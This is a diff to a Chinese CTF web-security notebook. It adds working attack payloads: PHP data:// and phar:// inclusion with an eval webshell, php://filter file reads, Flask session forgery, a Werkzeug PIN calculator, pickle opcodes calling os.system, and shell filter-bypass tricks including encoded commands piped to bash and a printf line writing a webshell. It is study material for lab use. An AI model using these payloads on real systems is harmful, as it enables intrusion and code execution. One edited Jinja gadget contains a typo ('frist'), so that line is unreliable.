@@ -1390,6 +1390,135 @@ mkdir("tmplink");
 
 
 
+####  file://
+
+读取本地文件，浏览器读取本地文件的时候，用的也是这个协议
+
+####  data://
+
+[文件包含漏洞之PHP伪协议中的data://的那些事~_Firebasky的博客-CSDN博客](https://blog.csdn.net/qq_46091464/article/details/106665358)
+
+条件：
+
+- `allow_url_include`: `On`
+- PHP >= 5.2.0
+
+格式：
+
+`data:[<mediatype>][;base64],<data>`
+
+- `<mediatype>`：可选，指定数据的媒体类型（MIME 类型），例如 `text/plain`、`image/jpeg` 等。这部分内容可以省略。
+- `;base64`：可选，表示数据采用 Base64 编码。如果提供了 `;base64`，那么数据部分应该是经过 Base64 编码的。
+- `<data>`：实际的数据内容。
+
+```
+?file=data://text/plain,<?php phpinfo();?>
+?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
+?file=data://text/plain;base64,PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8%2B
+```
+
+该协议类似于 php://input，区别在于 data:// 是直接获取后面跟着的内容。浏览器一般都支持这个协议，最常用的莫过于展示小图片了；在 CTF 中常用于执行任意 PHP 代码。
+
+每个组件支持的会稍微有点区别，例如 `data:;,<?php phpinfo();?>` 在 Chrome 可以，但是在 PHP 不行
+
+####  dict://
+
+dict 协议是一个字典服务器协议，就是用来查单词的那种字典。字典服务器本来是为了让客户端使用过程中能够访问更多的字典源。
+
+dict 协议的格式：`dict://`+`ip:端口`+`/` + `TCP/IP 数据`
+
+与 gopher 相比，dict 携带的数据无法插入 `\r\n`（只能插入 `\\r\\n`），所以对于大部分组件来说，只能执行一条命令，所以如果一个组件可以一步一步操作（比如 redis），那么才可以利用，那么很明显，需要认证的 redis 是无法通过 dict 攻击的（即使你知道密码也没用），但是可以用来爆破密码。
+
+####  php://
+
+访问各个输入/输出流（I/O streams）。PHP 提供了一些杂项输入/输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符；内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。
+
+属于 PHP 中的伪协议，受限于 php.ini 中的配置
+
+#####  php://input
+
+作用：访问请求的原始数据的只读流
+
+条件：
+
+- `allow_url_include`: `On`
+
+- form 表单里的 enctype 不为 `multipart/form-data`（默认为 `application/x-www-form-urlencoded`）。体现在请求头里就是 Content-Type 不能为 `multipart/form-data`（文件上传）
+
+  > Multipart 允许客户端在一次 HTTP 请求中发送多个部分（part）数据，每部分数据之间的类型可以不同。
+
+PHP 在遇到这个伪协议的时候，会读取 POST 的数据当做内容。
+
+比如 readfile、file_get_contents、include，都支持此伪协议。在 CTF 中常用于执行任意 PHP 代码。
+
+#####  php://filter
+
+作用：用于数据流打开时，对数据进行筛选、过滤。
+
+条件：无
+
+格式：`php://filter/[0]=[1]/resource=[2]`
+
+其中：
+
+- `[0]`: 可选 read/write
+- `[1]`: 就是过滤器，可以设定一个或多个过滤器名称，以管道符（`|`）分隔即可。比如：`convert`、`string`，更多可参考官方文档：https://www.php.net/manual/zh/filters.php
+- `[2]`: 必选的值，为要筛选过滤的数据流，通常是本地文件的路径，绝对路径和相对路径均可以使用。
+
+示例：`php://filter/read=convert.base64-encode/resource=flag.php`
+
+表示读取本地文件 flag.php，并进行 base64 编码。
+
+在 CTF 中常用于读取 PHP 的源码。
+
+```
+php://filter 读取服务器中文件，并且在读的过程中会对数据进行编码
+
+php://filter/read=convert.base64-encode/resource=要读的文件名
+
+php://filter/convert.base64-encode/resource=要读的文件名
+
+php://filter/string.rot13/resource=要读的文件名
+
+file=php://filter/convert.iconv.utf-8.utf-7/resource=flag.php
+iconv.从这个编码.转换到这个编码
+```
+
+>iconv ( string $in_charset , string $out_charset , string $str ) : 
+>string将字符串 str 从 in_charset 转换编码到 out_charset。
+>in_charset：输入的字符集。
+>out_charset：输出的字符集。
+>
+>```php
+><?php
+>echo iconv("UCS-2LE","UCS-2BE",'<?php @eval($_POST[hack]);?>');
+>?>
+>//?<hp pe@av(l_$OPTSh[ca]k;)>?
+>```
+
+####  phar://
+
+- 作用：属于 PHP 伪协议，phar（PHP Archive) 是 PHP 里类似于 JAR 的一种打包文件。
+- 条件：
+  - PHP >= 5.3.0
+
+phar:// 的利用场景示例：
+
+```php
+<?php
+  $files = $_GET['file'];
+  include($files);
+?>
+```
+
+对于这样的例子，先上传一个 zip 压缩包，里面是一个 txt 文件，内容是：`<?php phpinfo(); ?>`，在知道绝对路径（/www/upload/test.zip）之后，可以利用 phar:// 来执行这段代码，payload: `phar:///www/upload/test.zip/test.txt`
+
+####  zip://
+
+- 作用：属于 PHP 伪协议，用于访问 zip 压缩流
+
+格式：`zip://[压缩文件绝对路径]#[压缩文件内的路径以及文件名]`
+
 ## SSRF和Gopher
 
 <u>*awctf --- i_am_eeeeeshili*</u>
@@ -3517,7 +3646,7 @@ except Exception:
 5. 空格：`{{ {}|center|last }}`、`{1:1}|xmlattr|first`
 6. `<`：`{}|select|string|first`
 7. `F>`：`{}|select|string|last`
-8. 点：`{{ self|float|string|min }}` 或者 `c.__lt__|string|truncate(3)|first`
+8. 点：`{{ self|float|string|min }}` 或者 `config['__lt__']|string|truncate(3)|frist`
 9. `a-z`：`{{ range.__doc__ + dict.__doc__}}`
 10. `A-Z`：`{{ (range.__doc__ + dict.__doc__) | upper }}`
 
@@ -3534,7 +3663,7 @@ except Exception:
 >
 >`<bound method Undefined._fail_with_undefined_error of Undefined>`：这个错误信息是由Jinja2模板引擎的Undefined对象引起的。当在模板中引用了一个未定义的变量或对象时，Jinja2会将其表示为Undefined对象，以便在模板渲染过程中进行处理。
 >
->`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。
+>`truncate()` 过滤器用于截断字符串并添加省略号。它可以将一个较长的字符串截断为指定的长度，并在截断处添加省略号以表示字符串被截断了。[Flask中truncate过滤器无效，不起作用的问题，truncate详解-CSDN博客](https://blog.csdn.net/yueguangMaNong/article/details/85196199)
 >
 >`{{"Hello, World!"|truncate(6)}}` -> `Hel...`
 
@@ -4001,6 +4130,180 @@ Cookie方式，利用request.cookies传递参数
 
 ### session 信息泄露 & 伪造
 
+[SecMap - Flask - Tr0y's Blog](https://www.tr0y.wang/2022/05/16/SecMap-flask)
+
+session 的作用大家都比较熟悉了，就不用介绍了。
+
+它的常见实现形式是当用户发起一个请求的时候，后端会检查该请求中是否包含 sessionid，如果没有则会创造一个叫 sessionid 的 cookie，用于区分不同的 session。sessionid 返回给浏览器，并将 sessionid 保存到服务器的内存里面；当已经有了 sessionid，服务端会检查找到与该 sessionid 相匹配的信息直接用。
+
+所以显而易见，session 和 sessionid 都是后端生成的。且由于 session 是后端识别不同用户的重要依据，而 sessionid 又是识别 session 的唯一依据，所以 session 一般都保存在服务端避免被轻易窃取，只返回随机生成的 sessionid 给客户端。对于攻击者来说，假设需要冒充其他用户，那么必须能够猜到其他用户的 sessionid，这是比较困难的。
+
+对于 flask 来说，它的 session 不是保存到内存里的，而是直接把整个 session 都塞到 cookie 里返回给客户端。那么这会导致一个问题，如果我可以直接按照格式生成一个 session 放在 cookie 里，那么就可以达到欺骗后端的效果。
+
+阅读源码可知，flask 生成 session 的时候会进行序列化，主要有以下几个步骤：
+
+1. 用 `json.dumps` 将对象转换成 json 字符串
+2. 如果第一步的结果可以被压缩，则用 zlib 库进行压缩
+3. 进行 base64 编码
+4. 通过 secret_key 和 hmac 算法（flask 这里的 hmac 默认用 sha1 进行 hash，还多了一个 salt，默认是 `cookie-session`）对结果进行签名，将签名附在结果后面（用 `.` 拼接）。如果第二步有压缩的话，结果的开头会加上 `.` 标记。
+
+可以看到，最后一步解决了用户篡改 session 的安全问题，因为在不知道 secret_key 的情况下，是无法伪造签名的。
+
+所以这会直接导致 2 个可能的安全问题：
+
+1. 数字签名的作用是防篡改，没有保密的作用。所以 flask 的 session 解开之后可以直接看到明文信息，可能会导致数据泄露
+2. 如果知道 secret_key 那么可以伪造任意有效的 session（这个说法并不完全准确）
+
+>[noraj/flask-session-cookie-manager: :cookie: Flask Session Cookie Decoder/Encoder (github.com)](https://github.com/noraj/flask-session-cookie-manager)
+
+```python
+from flask import Flask, session
+
+
+app = Flask(__name__)
+app.secret_key = 'wi1shu'
+
+@app.route('/')
+def hello():
+    if session.get("user", None):
+        user = session.get("user", None)
+    else:
+        session['user'] = user = 'user'
+    return f'Welcome, {user}!'
+
+
+app.run(debug=True, port=50001)
+```
+
+![image-20231210163520237](daydayup.assets/image-20231210163520237.png)
+
+session为`eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4`，可以通过flask-session-cookie-manager-master将其解码或者自行进行base64解码
+
+![image-20231210163933696](daydayup.assets/image-20231210163933696.png)
+
+>`URLSafeTimedSerializer` 是 Flask-WTF 库中的一个类，用于生成和验证包含时间戳的 URL 安全的序列化（serialized）令牌。它主要用于在 Web 应用中处理安全性相关的功能，例如生成带有时效性的重置密码链接或身份验证令牌。
+>
+>`URLSafeTimedSerializer` 的作用：
+>
+>1. **生成 URL 安全的令牌：** 通过将数据序列化并附加时间戳，生成一个 URL 安全的字符串令牌。这个令牌可以包含一些信息（如用户 ID、操作类型等），并且由于是 URL 安全的，可以方便地用于构建重置密码链接或其他包含敏感信息的 URL。
+>2. **验证令牌的有效性和时效性：** 可以通过令牌的解析来验证令牌的有效性和时效性。这有助于确保令牌在一段时间后过期，从而提高安全性。一旦令牌过期，就不能再被验证。
+>
+>```python
+>from flask import Flask
+>from itsdangerous import URLSafeTimedSerializer
+>
+>app = Flask(__name__)
+>app.config['SECRET_KEY'] = 'wi1shu'
+>
+>serializer = URLSafeTimedSerializer(app.config['SECRET_KEY'])
+>
+># 生成令牌
+>user_id = 123
+>token = serializer.dumps(user_id, salt='reset-password')
+>
+># 验证令牌
+>try:
+>    data = serializer.loads(token, salt='reset-password', max_age=3600)  # 令牌有效期为 1 小时
+>    print(f"Valid token. User ID: {data}")
+>except:
+>    print("Invalid or expired token.")
+>```
+
+可利用URLSafeTimedSerializer进行解码与编码，也可以利用flask-session-cookie-manager-master
+
+```python
+from itsdangerous import URLSafeTimedSerializer, base64_decode, encoding
+
+session = "eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4"
+session_list = session.split(".")
+
+print(base64_decode(session_list[0]))
+# b'{"user":"user"}'
+
+print(base64_decode(session_list[1]))
+# b'eux8'
+
+# 验证session
+print(URLSafeTimedSerializer('wi1shu',
+                             salt="cookie-session", # 默认值
+                             signer_kwargs={"key_derivation": "hmac"}
+                             ).loads_unsafe(session))
+# (True, {'user': 'user'})
+
+# 生成session
+print(URLSafeTimedSerializer('wi1shu',
+                             salt="cookie-session",  # 默认
+                             signer_kwargs={"key_derivation": "hmac"}
+                             ).dumps({'user': 'admin'}))
+# eyJ1c2VyIjoiYWRtaW4ifQ.ZXV76w.jvG0kY94ZYQ2fVYDnwebKFD4Ny8
+```
+
+```
+利用flask-session-cookie-manager-master
+python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4
+b'{"user":"user"}'
+
+python flask_session_cookie_manager3.py decode -c eyJ1c2VyIjoidXNlciJ9.ZXV4OA.63R_94KNDsPsTIwGayzQBi6B2y4 -s wi1shu
+{'user': 'user'}
+
+python flask_session_cookie_manager3.py encode -t "{'user':'admin'}" -s wi1shu
+eyJ1c2VyIjoiYWRtaW4ifQ.ZXV8ZA.8JmyoQrizHyJrk1TL84S1xIqDgs
+```
+
+
+
+### pin码伪造
+
+pin码计算脚本
+
+```python
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+    'www',  # flask执⾏whoami获取
+    'flask.app',  # modname，linux基本上都是这个，mac有所不同
+    'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.8/dist-packages/flask/app.py'  # 可以通过debug报错的⻚⾯观察到。
+]
+# "".__class__.__bases__[0].__subclasses__()[279]('cat+/etc/passwd',shell=True,stdout=-1).communicate()[0].strip()
+private_bits = [
+    '2485377892354',  # ssti获取/sys/class/net/eth0/address
+    '6079fc23-7220-4a30-aab3-c0a7a4f5fb62ea7476749876bc8a6302ce91efe1a0461e74a1778f0b9d516318fc5a032036e1'
+    # ssti获取/proc/sys/kernel/random/boot_id + /proc/self/cgroup
+]
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode('utf-8')
+    h.update(bit)
+h.update(b'cookiesalt')
+# h.update(b'shittysalt')
+
+cookie_name = f"__wzd{h.hexdigest()[:20]}"
+
+num = None
+if num is None:
+    h.update(b'pinsalt')
+    num = f"{int(h.hexdigest(), 16):09d}"[:9]
+
+rv = None
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
+                          for x in range(0, len(num), group_size))
+            break
+    else:
+        rv = num
+
+print(rv)
+
+```
+
 
 
 ## Python 反序列化
@@ -4069,32 +4372,32 @@ BININT2        = b'M'   # push 2-byte unsigned int
 NONE           = b'N'   # 栈中压入 None
 PERSID         = b'P'   # push persistent object; id is taken from string arg
 BINPERSID      = b'Q'   # push persistent object; id is taken from stack
-REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调用该函数并把结果压回栈
+REDUCE         = b'R'   # 从栈上弹出两个对象，第一个对象作为参数（必须为元组），第二个对象作为函数，然后调							用该函数并把结果压回栈
 STRING         = b'S'   # 实例化一个字符串对象
 BINSTRING      = b'T'   # push string; counted binary string argument
 SHORT_BINSTRING= b'U'   # push string; counted binary string argument < 256 bytes
 UNICODE        = b'V'   # 实例化一个 UNICODE 字符串对象
 BINUNICODE     = b'X'   # push Unicode string; counted UTF-8 string argument
 APPEND         = b'a'   # 将栈的第一个元素 append 到第二个元素（必须为列表）中
-BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进行属性设置，调用 __setstate__ 或 __dict__.update()
-GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压入栈
-DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-value 对），弹出组合，弹出 MARK，压回结果
+BUILD          = b'b'   # 使用栈中的第一个元素（储存多个 属性名-属性值 的字典）对第二个元素（对象实例）进							 行属性设置，调用 __setstate__ 或 __dict__.update()
+GLOBAL         = b'c'   # 获取一个全局对象或 import 一个模块（会调用 import 语句，能够引入新的包），压						  入栈
+DICT           = b'd'   # 寻找栈中的上一个 MARK，并组合之间的数据为字典（数据必须有偶数个，即呈 key-						  value 对），弹出组合，弹出 MARK，压回结果
 EMPTY_DICT     = b'}'   # 向栈中直接压入一个空字典
-APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必须为列表）中
+APPENDS        = b'e'   # 寻找栈中的上一个 MARK，组合之间的数据并 extends 到该 MARK 之前的一个元素（必							须为列表）中
 GET            = b'g'   # 将 memo[n] 的压入栈
 BINGET         = b'h'   # push item from memo on stack; index is 1-byte arg
-INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
+INST           = b'i'   # 相当于 c 和 o 的组合，先获取一个全局函数，然后从栈顶开始寻找栈中的上一个 							  MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）
 LONG_BINGET    = b'j'   # push item from memo on stack; index is 4-byte arg
 LIST           = b'l'   # 从栈顶开始寻找栈中的上一个 MARK，并组合之间的数据为列表
 EMPTY_LIST     = b']'   # 向栈中直接压入一个空列表
-OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 MARK，压回结果，
+OBJ            = b'o'   # 从栈顶开始寻找栈中的上一个 MARK，以之间的第一个数据（必须为函数）为 									  callable，第二个到第 n 个数据为参数，执行该函数（或实例化一个对象），弹出 							  MARK，压回结果，
 PUT            = b'p'   # 将栈顶对象储存至 memo[n]
 BINPUT         = b'q'   # store stack top in memo; index is 1-byte arg
 LONG_BINPUT    = b'r'   # store stack top in memo; index is 4-byte arg
-SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必须为列表或字典，列表以数字作为 key）中
+SETITEM        = b's'   # 将栈的第一个对象作为 value，第二个对象作为 key，添加或更新到栈的第三个对象（必							须为列表或字典，列表以数字作为 key）中
 TUPLE          = b't'   # 寻找栈中的上一个 MARK，并组合之间的数据为元组，弹出组合，弹出 MARK，压回结果
 EMPTY_TUPLE    = b')'   # 向栈中直接压入一个空元组
-SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
+SETITEMS       = b'u'   # 寻找栈中的上一个 MARK，组合之间的数据（数据必须有偶数个，即呈 key-value 对）						  并全部添加或更新到该 MARK 之前的一个元素（必须为字典）中
 BINFLOAT       = b'G'   # push float; arg is 8-byte float encoding
 
 TRUE           = b'I01\n'  # not an opcode; see INT docs in pickletools.py
@@ -4621,7 +4924,7 @@ class Point:
   # def __getnewargs__(self):
       # return (self.x, self.y)
 
-    def __new__(cls, x, y):
+    def __new__(cls, args):
         print("__new()__  ->  " + repr(args))
         return super().__new__(cls)
 
@@ -5013,9 +5316,590 @@ except:
 
 所以，假如有一个库是 A，里面有个类 b，要修改 b 的属性，原本要执行的 `cA\nb\n}Va\nI1\nsb.` 应该改为 `cA\nb\n(N}Va\nI1\ntsb.` 或者 `cA\nb\n(}}Va\nI1\ntsb.`
 
+>#### 拼接opcode
+>
+>将第一个pickle流结尾表示结束的 `.` 去掉，将第二个pickle流与第一个拼接起来即可。
+>
+>#### 全局变量覆盖
+>
+>python源码：
+>
+>```
+># secret.py
+>name='TEST3213qkfsmfo'
+># main.py
+>import pickle
+>import secret
+>
+>opcode='''c__main__
+>secret
+>(S'name'
+>S'1'
+>db.'''
+>
+>print('before:',secret.name)
+>
+>output=pickle.loads(opcode.encode())
+>
+>print('output:',output)
+>print('after:',secret.name)
+>```
+>
+>首先，通过 `c` 获取全局变量 `secret` ，然后建立一个字典，并使用 `b` 对secret进行属性设置，使用到的payload：
+>
+>```
+>opcode='''c__main__
+>secret
+>(S'name'
+>S'1'
+>db.'''
+>```
+>
+>#### 函数执行
+>
+>与函数执行相关的opcode有三个： `R` 、 `i` 、 `o` ，所以我们可以从三个方向进行构造：
+>
+>1. `R` ：
+>
+>```
+>b'''cos
+>system
+>(S'whoami'
+>tR.'''
+>```
+>
+>1. `i` ：
+>
+>```
+>b'''(S'whoami'
+>ios
+>system
+>.'''
+>```
+>
+>1. `o` ：
+>
+>```
+>b'''(cos
+>system
+>S'whoami'
+>o.'''
+>```
+>
+>#### 实例化对象
+>
+>实例化对象是一种特殊的函数执行，这里简单的使用 `R` 构造一下，其他方式类似：
+>
+>```
+>class Student:
+>    def __init__(self, name, age):
+>        self.name = name
+>        self.age = age
+>
+>data=b'''c__main__
+>Student
+>(S'XiaoMing'
+>S"20"
+>tR.'''
+>
+>a=pickle.loads(data)
+>print(a.name,a.age)
+>```
+>
+>#### pker的使用（推荐）
+>
+>- pker是由@eddieivan01编写的以仿照Python的形式产生pickle opcode的解析器，可以在https://github.com/eddieivan01/pker下载源码。解析器的原理见作者的paper：[通过AST来构造Pickle opcode](https://xz.aliyun.com/t/7012)。
+>- 使用pker，我们可以更方便地编写pickle opcode，pker的使用方法将在下文中详细介绍。需要注意的是，建议在能够手写opcode的情况下使用pker进行辅助编写，不要过分依赖pker。
+>
+>#### 注意事项
+>
+>pickle序列化的结果与操作系统有关，使用windows构建的payload可能不能在linux上运行。比如：
+>
+>```
+># linux(注意posix):
+>b'cposix\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>
+># windows(注意nt):
+>b'cnt\nsystem\np0\n(Vwhoami\np1\ntp2\nRp3\n.'
+>```
+>
+>### pker能做的事
+>
+>引用自https://xz.aliyun.com/t/7012#toc-5：
+>
+>> - 变量赋值：存到memo中，保存memo下标和变量名即可
+>> - 函数调用
+>> - 类型字面量构造
+>> - list和dict成员修改
+>> - 对象成员变量修改
+>
+>具体来讲，可以使用pker进行原变量覆盖、函数执行、实例化新的对象。
+>
+>### 使用方法与示例
+>
+>1. pker中的针对pickle的特殊语法需要重点掌握（后文给出示例）
+>2. 此外我们需要注意一点：python中的所有类、模块、包、属性等都是对象，这样便于对各操作进行理解。
+>3. pker主要用到`GLOBAL、INST、OBJ`三种特殊的函数以及一些必要的转换方式，其他的opcode也可以手动使用：
+>
+>```
+>以下module都可以是包含`.`的子module
+>调用函数时，注意传入的参数类型要和示例一致
+>对应的opcode会被生成，但并不与pker代码相互等价
+>
+>GLOBAL
+>对应opcode：b'c'
+>获取module下的一个全局对象（没有import的也可以，比如下面的os）：
+>GLOBAL('os', 'system')
+>输入：module,instance(callable、module都是instance)  
+>
+>INST
+>对应opcode：b'i'
+>建立并入栈一个对象（可以执行一个函数）：
+>INST('os', 'system', 'ls')  
+>输入：module,callable,para 
+>
+>OBJ
+>对应opcode：b'o'
+>建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：
+>OBJ(GLOBAL('os', 'system'), 'ls') 
+>输入：callable,para
+>
+>xxx(xx,...)
+>对应opcode：b'R'
+>使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）
+>
+>li[0]=321
+>或
+>globals_dic['local_var']='hello'
+>对应opcode：b's'
+>更新列表或字典的某项的值
+>
+>xx.attr=123
+>对应opcode：b'b'
+>对xx对象进行属性设置
+>
+>return
+>对应opcode：b'0'
+>出栈（作为pickle.loads函数的返回值）：
+>return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组）
+>```
+>
+>注意：
+>
+>1. 由于opcode本身的功能问题，pker肯定也不支持列表索引、字典索引、点号取对象属性作为**左值**，需要索引时只能先获取相应的函数（如`getattr`、`dict.get`）才能进行。但是因为存在`s`、`u`、`b`操作符，**作为右值是可以的**。即“查值不行，赋值可以”。
+>2. pker解析`S`时，用单引号包裹字符串。所以pker代码中的双引号会被解析为单引号opcode:
+>
+>```
+>test="123"
+>return test
+>```
+>
+>被解析为：
+>
+>```
+>b"S'123'\np0\n0g0\n."
+>```
+>
+>#### pker：全局变量覆盖
+>
+>- 覆盖直接由执行文件引入的`secret`模块中的`name`与`category`变量：
+>
+>```
+>secret=GLOBAL('__main__', 'secret') 
+># python的执行文件被解析为__main__对象，secret在该对象从属下
+>secret.name='1'
+>secret.category='2'
+>```
+>
+>- 覆盖引入模块的变量：
+>
+>```
+>game = GLOBAL('guess_game', 'game')
+>game.curr_ticket = '123'
+>```
+>
+>接下来会给出一些具体的基本操作的实例。
+>
+>#### pker：函数执行
+>
+>- 通过`b'R'`调用：
+>
+>```
+>s='whoami'
+>system = GLOBAL('os', 'system')
+>system(s) # `b'R'`调用
+>return
+>```
+>
+>- 通过`b'i'`调用：
+>
+>```
+>INST('os', 'system', 'whoami')
+>```
+>
+>- 通过`b'c'`与`b'o'`调用：
+>
+>```
+>OBJ(GLOBAL('os', 'system'), 'whoami')
+>```
+>
+>- 多参数调用函数
+>
+>```
+>INST('[module]', '[callable]'[, par0,par1...])
+>OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...])
+>```
+>
+>#### pker：实例化对象
+>
+>- 实例化对象是一种特殊的函数执行
+>
+>```
+>animal = INST('__main__', 'Animal','1','2')
+>return animal
+>
+>
+># 或者
+>
+>animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')
+>return animal
+>```
+>
+>- 其中，python原文件中包含：
+>
+>```
+>class Animal:
+>
+>    def __init__(self, name, category):
+>        self.name = name
+>        self.category = category
+>```
+>
+>- 也可以先实例化再赋值：
+>
+>```
+>animal = INST('__main__', 'Animal')
+>animal.name='1'
+>animal.category='2'
+>return animal
+>```
+>
+>#### 手动辅助
+>
+>- 拼接opcode：将第一个pickle流结尾表示结束的`.`去掉，两者拼接起来即可。
+>- 建立普通的类时，可以先pickle.dumps，再拼接至payload。
+>
+>#### [Macr0phag3/souse: A tool for converting Python source code to opcode(pickle) (github.com)](https://github.com/Macr0phag3/souse)
+
+## Python 原型链污染
+
+
+
 ## 命令执行绕过
 
 ![命令执行绕过](daydayup.assets/命令执行绕过.jpg)
+
+#### 空格
+
+```
+#常见的绕过符号有：
+$IFS$9 、${IFS} 、%09(php环境下)、 重定向符<>、<、
+kg=$'\x20flag.txt'&&cat$kg
+# $IFS在linux下表示分隔符，如果不加{}则bash会将IFS解释为一个变量名，加一个{}就固定了变量名，$IFS$9后面之所以加个$是为了起到截断的作用
+set |grep IFS
+IFS=$' \t\n'
+
+<：输入重定向，后面需要接目录或者文件名，例如ls<./，所以不是所有的命令都可以使用它作为空格替代符，例如ping
+<>：打开一个文件作为输入与输出使用。所以它比<的限制更严格，后面必须是文件，连目录都不行
+%09：url 编码的制表符的。
+%0a：url 编码的换行符。
+```
+
+#### 命令分隔符
+
+```
+%0a  #换行符，需要php环境
+%0d  #回车符，需要php环境
+%09  #TAB
+%00	 #url 编码的 NULL，高版本（>=5.4.38）PHP 的 exec、system、passthru 都会拦截
+;    #在 shell 中，是”连续指令”，不论;前面的命令执行成功与否都会执行后面的命令
+&    #& 放在启动参数后面表示设置此进程为后台进程，这里可以巧妙地作为命令分隔符：ls&whoami实际上相当于 ls &; whoami，即将ls放到后台运行，结束后再运行 whoami。不管第一条命令成功与否，都会执行第二条命令
+&&   #第一条命令成功，第二条才会执行
+|    #第一条命令的结果，作为第二条命令的输入
+||   #第一条命令失败，第二条才会执行
+```
+
+利用`{}`
+
+花括号扩展本来的作用是组合，看下面的例子，a、b 都是候选字符，输出的结果是候选的组合。我们可以看到，中间多了一个空格。所以就可以这样利用
+
+```bash
+soyamilk@DESKTOP-13QDS1A:~$ echo {a,b}
+a b
+soyamilk@DESKTOP-13QDS1A:~$ echo ab{a,b}ccc
+abaccc abbccc
+soyamilk@DESKTOP-13QDS1A:~$ {a,b}
+a: command not found
+soyamilk@DESKTOP-13QDS1A:~$ {ls,.}
+a  b  flag
+soyamilk@DESKTOP-13QDS1A:~$ {cat,./flag}
+flag{abc}
+```
+
+需要多个参数也是可以的，加多个`,`就行：`{ls,-al,./}`，不过需要注意，使用花括号扩展的时候，`{}`中不能有空格。
+
+```
+soyamilk@DESKTOP-13QDS1A:~$ {ls,-al,./}
+total 24
+drwxr-xr-x 1 soyamilk soyamilk 4096 Oct 16 16:31 .
+drwxr-xr-x 1 root     root     4096 Jul 12 11:20 ..
+-rw------- 1 soyamilk soyamilk 1617 Oct 16 18:07 .bash_history
+-rw-r--r-- 1 soyamilk soyamilk  220 Jul 12 11:20 .bash_logout
+-rw-r--r-- 1 soyamilk soyamilk 3771 Jul 12 11:20 .bashrc
+drwxr-xr-x 1 soyamilk soyamilk 4096 Jul 12 11:20 .landscape
+-rw-r--r-- 1 soyamilk soyamilk    0 Nov 23 15:16 .motd_shown
+-rw-r--r-- 1 soyamilk soyamilk  807 Jul 12 11:20 .profile
+-rw-r--r-- 1 soyamilk soyamilk    0 Sep 19 21:29 .sudo_as_admin_successful
+-rw------- 1 soyamilk soyamilk 8273 Oct 16 16:30 .viminfo
+-rw-r--r-- 1 soyamilk soyamilk   15 Oct 16 16:31 a
+-rw-r--r-- 1 soyamilk soyamilk    0 Oct 16 16:31 b
+-rw-r--r-- 1 soyamilk soyamilk   10 Oct 16 16:32 flag
+```
+
+
+
+#### 关键字
+
+**能够进行查看的命令**
+
+```
+过滤系统命令关键字——换用关键字平替：
+Linux中与cat类似的读取打开文件命令
+nl：读取显示文件内容的时候，顺便标上行号
+tac：从最后一行开始读取显示文件内容，容易发现tac是cat的倒序，即它俩在读取文件内容时顺序相反
+more：一页一页的显示档案内容
+less：与more类似
+head：查看前几行（头部）
+tail：查看后几行（尾部）
+od：以二进制的方式读取档案内容
+vi：一种编辑器，这个也可以查看
+vim：一种编辑器，这个也可以查看
+sort：可以查看
+uniq: 可以查看
+base64
+```
+
+- 拼接绕过
+
+  ```
+  #执行ls命令：
+  a=l;b=s;$a$b
+  #cat flag文件内容：
+  a=c;b=at;c=f;d=lag;$a$b ${c}${d}
+  #cat test文件内容
+  a="ccaatt";b=${a:0:1}${a:2:1}${a:4:1};$b test
+  ```
+
+- 编码绕过
+
+  ```
+  #base64
+  echo "Y2F0IC9mbGFn"|base64 -d|bash  ==> cat /flag
+  echo Y2F0IC9mbGFn|base64 -d|sh      ==> cat /flag
+  #hex
+  echo "0x636174202f666c6167" | xxd -r -p|bash   ==> cat /flag
+  
+  $(printf "\154\163") ==>ls
+  $(printf "\x63\x61\x74\x20\x2f\x66\x6c\x61\x67") ==>cat /flag
+  {printf,"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"}|\$0 ==>cat /flag
+  #i也可以通过这种方式写马
+  #内容为<?php @eval($_POST['c']);?>
+  ${printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"} >> 1.php
+  ```
+
+- 单引号和双引号绕过
+
+  ```
+  c'a't /flag
+  c"a"t /flag
+  ```
+
+- 反斜杠绕过
+
+  ```
+  ca\t /flag
+  ```
+
+- 通过$PATH绕过
+
